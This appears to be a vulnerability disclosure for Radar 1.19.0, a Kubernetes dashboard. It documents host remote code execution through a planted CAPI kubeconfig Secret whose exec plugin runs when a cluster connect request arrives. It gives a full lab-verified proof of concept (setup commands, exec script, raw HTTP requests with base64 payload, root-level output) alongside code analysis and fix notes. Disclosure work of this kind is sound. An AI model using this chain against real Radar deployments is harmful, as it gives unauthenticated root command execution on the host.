### Vulnerability details

**Official website / Product:** https://www.radarhq.io / https://github.com/skyhook-io/radar

**Repository:** skyhook-io/radar (stars at selection: 4007)

**Vulnerability type:** RCE / getshell (YAML apply → CAPI `{name}-kubeconfig` Secret with `user.exec` → `ClientConfig()` host command execution)

**Vulnerability versions:** Radar **1.19.0** official binary (`/usr/local/bin/radar`); audited source tip `956a50217782685a579c4033d295a6076259a5ff`. Lab: host Radar + Docker `rancher/k3s:v1.31.4-k3s1` (API `127.0.0.1:26443→6443`). Default `--auth-mode=none` (no credentials on local API); `--disable-local-terminal` set so local-terminal is out of scope.

**Vulnerability URL / Parameter:**
- Plant: `POST /api/resources/apply` — Secret `default/{name}-kubeconfig`, key `data.value` = base64 kubeconfig with `users[].user.exec.command`
- Trigger: `POST /api/capi/clusters/{ns}/{name}/connect` (body `{}`)

**Complex:** yes

### Verification procedure

1. Start the management cluster (Docker k3s, host port **26443**):
   ```bash
   docker run -d --name k3s-r11a3 --privileged \
     -p 127.0.0.1:26443:6443 \
     rancher/k3s:v1.31.4-k3s1 server --tls-san 127.0.0.1 --disable traefik
   # Copy kubeconfig from the container; retarget server to https://127.0.0.1:26443
   # (insecure-skip-tls-verify or install the cluster CA)
   ```
2. Start Radar 1.19.0 on **127.0.0.1:19103** (no auth, local-terminal disabled):
   ```bash
   radar --kubeconfig=/path/to/k3s-kubeconfig.yaml --port=19103 \
     --listen-address=127.0.0.1 --no-browser --disable-local-terminal
   # Confirm GET http://127.0.0.1:19103/api/connection reports connected
   ```
3. Prepare the host exec plugin script. The lab-verified request embeds the absolute path below — write it first (writes a marker and returns a fake ExecCredential):
   ```bash
   mkdir -p /tmp/grok-goal-c916b58e95b6/implementer/r11-a3
   cat > /tmp/grok-goal-c916b58e95b6/implementer/r11-a3/evil-exec.sh <<'SCRIPT'
   #!/bin/sh
   echo "RCE_OK $(id) $(date -Is)" > /tmp/radar-r11a3-host-rce-marker
   cat <<'JSON'
   {
     "apiVersion": "client.authentication.k8s.io/v1",
     "kind": "ExecCredential",
     "status": {
       "token": "fake-token-for-poc"
     }
   }
   JSON
   SCRIPT
   chmod 755 /tmp/grok-goal-c916b58e95b6/implementer/r11-a3/evil-exec.sh
   ```
4. Build a kubeconfig whose `user.exec.command` points at that script; base64 it into Secret `default/pwn-kubeconfig` key `data.value` (decoded YAML below; or send Step A as-is).
5. `POST /api/resources/apply` with the Secret YAML (`Content-Type: text/plain`).
6. `POST /api/capi/clusters/default/pwn/connect` with `{}`. Radar loads Secret `pwn-kubeconfig`, merges it, switches context; client-go runs the exec plugin as the Radar process **before** the fake apiserver `https://127.0.0.1:1` fails (HTTP 500).
7. `cat /tmp/radar-r11a3-host-rce-marker` shows `RCE_OK uid=0(root) ...`.

### Complete vulnerability PoC

Complete HTTP request (lab-verified):

```http
# --- Step A: apply malicious CAPI kubeconfig Secret ---
POST /api/resources/apply HTTP/1.1
Host: 127.0.0.1:19103
User-Agent: radar-r11a3-poc/1.0
Accept: */*
Content-Type: text/plain
Content-Length: 611
Connection: close

apiVersion: v1
kind: Secret
metadata:
  name: pwn-kubeconfig
  namespace: default
type: Opaque
data:
  value: YXBpVmVyc2lvbjogdjEKa2luZDogQ29uZmlnCmNsdXN0ZXJzOgotIGNsdXN0ZXI6CiAgICBzZXJ2ZXI6IGh0dHBzOi8vMTI3LjAuMC4xOjEKICBuYW1lOiBldmlsCmNvbnRleHRzOgotIGNvbnRleHQ6CiAgICBjbHVzdGVyOiBldmlsCiAgICB1c2VyOiBldmlsCiAgbmFtZTogZXZpbApjdXJyZW50LWNvbnRleHQ6IGV2aWwKdXNlcnM6Ci0gbmFtZTogZXZpbAogIHVzZXI6CiAgICBleGVjOgogICAgICBhcGlWZXJzaW9uOiBjbGllbnQuYXV0aGVudGljYXRpb24uazhzLmlvL3YxCiAgICAgIGNvbW1hbmQ6IC90bXAvZ3Jvay1nb2FsLWM5MTZiNThlOTViNi9pbXBsZW1lbnRlci9yMTEtYTMvZXZpbC1leGVjLnNoCiAgICAgIGludGVyYWN0aXZlTW9kZTogTmV2ZXIK

# --- Step B: CAPI connect → ClientConfig() runs exec plugin on Radar host ---
POST /api/capi/clusters/default/pwn/connect HTTP/1.1
Host: 127.0.0.1:19103
User-Agent: radar-r11a3-poc/1.0
Accept: */*
Content-Type: application/json
Content-Length: 2
Connection: close

{}
```

Decoded `data.value` kubeconfig (for readability; Step A body carries the base64 form above; `command` must match the path installed in step 3, or re-base64 after changing it):

```yaml
apiVersion: v1
kind: Config
clusters:
- cluster:
    server: https://127.0.0.1:1
  name: evil
contexts:
- context:
    cluster: evil
    user: evil
  name: evil
current-context: evil
users:
- name: evil
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: /tmp/grok-goal-c916b58e95b6/implementer/r11-a3/evil-exec.sh
      interactiveMode: Never
```

Complete HTTP response (raw lab response):

```http
# --- Step A response ---
HTTP/1.1 200 OK
Content-Type: application/json
Vary: Origin
Date: Sun, 01 Nov 2026 14:25:58 GMT
Content-Length: 163
Connection: close

[{"name":"pwn-kubeconfig","namespace":"default","kind":"Secret","apiVersion":"v1","uid":"e8393170-5e64-4497-93cc-dc829aec441e","created":false,"action":"update"}]

# --- Step B response (500 after exec already ran) ---
HTTP/1.1 500 Internal Server Error
Content-Type: application/json
Vary: Origin
Date: Sun, 01 Nov 2026 14:25:58 GMT
Content-Length: 194
Connection: close

{"error":"failed to switch context: cluster connection failed: cluster unreachable: Get \"https://127.0.0.1:1/version?timeout=9.999996068s\": dial tcp 127.0.0.1:1: connect: connection refused"}

# --- Impact proof (host marker) ---
RCE_OK uid=0(root) gid=0(root) groups=0(root) 2026-11-01T09:25:58-05:00
```

Radar log snippet (lab-verified):

```
81:2026/11/01 09:25:58 "POST http://127.0.0.1:19103/api/resources/apply HTTP/1.1" from 127.0.0.1:38082 - 200 163B in 15.444339ms
82:2026/11/01 09:25:58 [capi] Added workload cluster kubeconfig: "/tmp/radar-capi-kubeconfig-2144414288.yaml" (context: "evil")
83:2026/11/01 09:25:58 [ops] Context switch START → "evil"
102:2026/11/01 09:25:58 [ops] Context switch FAILED at connectivity test: cluster unreachable: Get "https://127.0.0.1:1/version?timeout=9.999996068s": dial tcp 127.0.0.1:1: connect: connection refused (7ms since switch start)
104:2026/11/01 09:25:58 "POST http://127.0.0.1:19103/api/capi/clusters/default/pwn/connect HTTP/1.1" from 127.0.0.1:38090 - 500 194B in 10.861424ms
```

Host marker (expected `cat /tmp/radar-r11a3-host-rce-marker` output):

```
RCE_OK uid=0(root) gid=0(root) groups=0(root) 2026-11-01T09:25:58-05:00
```

Verification result notes:

- Step A returns HTTP 200 with `"action":"update"` (or `create` on first run) for Secret `pwn-kubeconfig`.
- Step B returns HTTP 500 because the planted kubeconfig points at a closed port; Radar log still shows `[capi] Added workload cluster kubeconfig` and context switch start — the exec plugin runs during `ClientConfig()` / connectivity setup.
- Host file `/tmp/radar-r11a3-host-rce-marker` contains `RCE_OK uid=0(root)...` written by the exec command as the Radar process user.
- `--disable-local-terminal` was set; this is not the local-terminal feature. Default `--auth-mode=none` — no Cookie/Token required for local direct HTTP.

### Vulnerability analysis

Radar’s CAPI “connect to workload cluster” flow treats a management-cluster Secret `{name}-kubeconfig` as a trusted kubeconfig for the Radar process:

1. `handleCAPIClusterConnect` reads `secret.Data["value"]` for `name + "-kubeconfig"` (no requirement that a CAPI `Cluster` CR exist).
2. `k8s.MergeAndSwitchContext` writes the bytes to a temp kubeconfig and registers the context.
3. `PerformContextSwitch` → `SwitchContext` builds REST config via `kubeConfig.ClientConfig()`. client-go **executes** `users[].user.exec.command` on the Radar host to obtain credentials.

An actor who can `POST /api/resources/apply` (default local `--auth-mode=none` with same-origin/direct clients; or any config-editable principal) can therefore plant an exec plugin and trigger **host OS RCE** as the Radar user via `/api/capi/clusters/.../connect`. That is outside the intended “apply YAML / manage the connected cluster” trust boundary and distinct from in-cluster privileged Pods or the (disabled) local-terminal feature.

### Trigger / sink source (full path and line numbers)

```go
# File: internal/server/server.go (same tip as labs/radar-r11a3/src)
# Lines: 5053-5155 (handleCAPIClusterConnect; failure path writes 500 after ClientConfig/connectivity probe)
func (s *Server) handleCAPIClusterConnect(w http.ResponseWriter, r *http.Request) {
	if !s.requireConfigEditable(w, r) {
		return
	}
	if !s.requireConnected(w) {
		return
	}

	ns := chi.URLParam(r, "ns")
	name := chi.URLParam(r, "name")
	// ...

	secretName := name + "-kubeconfig"
	secret, err := client.CoreV1().Secrets(ns).Get(r.Context(), secretName, metav1.GetOptions{})
	// ...

	kubeconfigData, ok := secret.Data["value"]
	if !ok {
		s.writeError(w, http.StatusNotFound, "kubeconfig secret does not contain 'value' key")
		return
	}

	newConfig, err := clientcmd.Load(kubeconfigData)
	// ... resolve contextName from newConfig.CurrentContext ...

	safetyBinding := k8s.CAPIClusterSafetyBinding(managementBinding, ns, name)
	qualifiedName, mergedPath, created, err := k8s.MergeAndSwitchContext(kubeconfigData, contextName, safetyBinding)
	// ...

	if err := k8s.PerformContextSwitch(qualifiedName); err != nil {
		discarded := k8s.DiscardFailedMergedContext(mergedPath, created)
		// ...
		s.writeError(w, http.StatusInternalServerError, "failed to switch context: "+err.Error())
		return
	}
```

```go
# File: internal/k8s/client.go
# Lines: 1837-1858 (SwitchContext → ClientConfig runs exec plugins)
	configOverrides := &clientcmd.ConfigOverrides{CurrentContext: overrideContextName}
	kubeConfig := clientcmd.NewNonInteractiveDeferredLoadingClientConfig(loadingRules, configOverrides)

	rawConfig, err := kubeConfig.RawConfig()
	// ...

	// Build the REST config for the new context
	config, err := kubeConfig.ClientConfig()
	if err != nil {
		log.Printf("[k8s] Failed to build client config for context %q: %v", name, err)
		return fmt.Errorf("%w for %q: %s", errKubeconfigClientSetupFailed, name, kubeconfigDiagnosticError(err))
	}
```

```go
# File: internal/server/server.go
# Line: 942 (route registration)
r.Post("/capi/clusters/{ns}/{name}/connect", s.handleCAPIClusterConnect)
```

### Fix notes

- When loading kubeconfigs from cluster Secrets for CAPI connect, disable or strip `exec` / `auth-provider` plugins (or run credential acquisition in a tightly sandboxed helper), and reject kubeconfigs whose auth is not static cert/token unless explicitly allowlisted by the operator.
- Optionally require a real CAPI Cluster object and attest Secret ownership before connect.
- Treat Secret-sourced kubeconfigs as untrusted input equivalent to uploading a kubeconfig file from the internet.
